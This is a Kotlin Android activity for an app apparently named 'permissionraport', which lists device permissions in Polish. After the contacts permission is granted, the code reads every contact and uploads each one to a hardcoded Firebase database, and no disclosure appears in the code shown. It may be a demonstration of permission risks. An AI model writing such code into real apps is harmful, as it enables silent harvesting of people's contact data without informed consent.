package com.komnacki.permissionraport

import android.content.DialogInterface
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.komnacki.read_contacts_permissions.Contact
import com.komnacki.read_contacts_permissions.Contacts
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {
    val PERMISSIONS_REQUEST_READ_CONTACTS = 1
    val defaultStatus : Boolean = false
//    lateinit var PERMISSIONS_LIST : ArrayList<PermissionItem>


//        PermissionItem("Kontakty", defaultStatus),
//        PermissionItem("Wiadomości", defaultStatus),
//        PermissionItem("Pamięć urządzenia", defaultStatus),
//        PermissionItem("Aparat", defaultStatus),
//        PermissionItem("Dyktafon", defaultStatus),
//        PermissionItem("Galeria", defaultStatus)
//    )

    private val databaseReference : DatabaseReference
        get() {
            var database = FirebaseDatabase.getInstance()
                .getReferenceFromUrl("https://permissionraport.firebaseio.com")
            return database
        }

    override fun onCreate(savedInstanceState : Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        var PERMISSIONS_LIST : ArrayList<PermissionItem> = ArrayList()
        PERMISSIONS_LIST.add(PermissionItem("Kontakty", defaultStatus))
        PERMISSIONS_LIST.add(PermissionItem("Wiadomosci", defaultStatus))
        PERMISSIONS_LIST.add(PermissionItem("Pamięć urządzenia", defaultStatus))
        PERMISSIONS_LIST.add(PermissionItem("Aparat", defaultStatus))
        PERMISSIONS_LIST.add(PermissionItem("Dyktafon", defaultStatus))
        PERMISSIONS_LIST.add(PermissionItem("Galeria", defaultStatus))

        val recyclerView : RecyclerView = findViewById(R.id.recycler_view)
        recyclerView.apply {
            layoutManager = LinearLayoutManager(this@MainActivity)
            adapter = PermissionListAdapter(PERMISSIONS_LIST)
        }


        FirebaseDatabase.getInstance().setPersistenceEnabled(true)

        btn_send.setOnClickListener {
            Log.d("MAIN:", "btn click")
//            c.getContacts()
//            database.child("test").child("1").setValue("Kamil")
//            finish()

            requestContactPermission()
        }
    }


    private fun sendToServer(c : Contact) {
        var database = FirebaseDatabase.getInstance()
            .getReferenceFromUrl("https://permissionraport.firebaseio.com")
        database.push().setValue(c.toString(), "addd")
    }

    fun requestContactPermission() {
        val c = Contacts(contentResolver)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val checkSelfPermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
            if (checkSelfPermission != PackageManager.PERMISSION_GRANTED) {
                if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS)) {
                    val builder = AlertDialog.Builder(this)
                    builder.setTitle("Read contacts access needed")
                    builder.setPositiveButton(android.R.string.ok, null)
                    builder.setMessage("Please enable access to contacts.")
                    builder.setOnDismissListener(DialogInterface.OnDismissListener {
                        requestPermissions(
                            arrayOf(android.Manifest.permission.READ_CONTACTS),
                            PERMISSIONS_REQUEST_READ_CONTACTS
                        )
                    })
                    builder.show()
                } else {
                    ActivityCompat.requestPermissions(
                        this,
                        arrayOf(android.Manifest.permission.READ_CONTACTS),
                        PERMISSIONS_REQUEST_READ_CONTACTS
                    )
                }
            } else {
                Log.d("MAIN: ", c.getContacts().toString())
                for (contact in c.getContacts()) {
                    sendToServer(contact)
                }
            }
        } else {
            Log.d("MAIN: ", c.getContacts().toString())
            for (contact in c.getContacts()) {
                sendToServer(contact)
            }
        }
    }
}